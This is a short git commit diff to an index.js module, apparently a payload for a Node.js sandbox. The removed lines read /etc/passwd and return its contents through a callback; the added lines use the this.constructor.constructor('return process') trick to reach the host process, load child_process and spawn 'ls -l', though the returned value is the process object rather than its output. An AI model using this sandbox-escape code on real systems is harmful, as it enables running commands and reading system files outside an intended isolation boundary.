798dbe33957c60ff2ff409c13f8c7d01cff2e4b4
nileninja <156793196+nileninja-1@users.noreply.github.com>
2026-02-09 14:21:13 +0300

    Use child process to list directory contents
    Replace file reading with child process execution.

--- index.js
+++ index.js
@@ -1,7 +1,10 @@
-const fs = require("fs");
+const globalFunc = this.constructor.constructor;
 
-const data = fs.readFileSync("/etc/passwd", "utf8");
+const hostProcess = globalFunc('return process')();
+
+const { spawn }  = hostProcess.mainModule.require('child_process');
+const child = spawn("ls", ["-l"]);
 
 module.exports = function (cb) {
-    cb(null, `Output: ${data}`)
+    cb(null, `Output: ${child}`)
 }
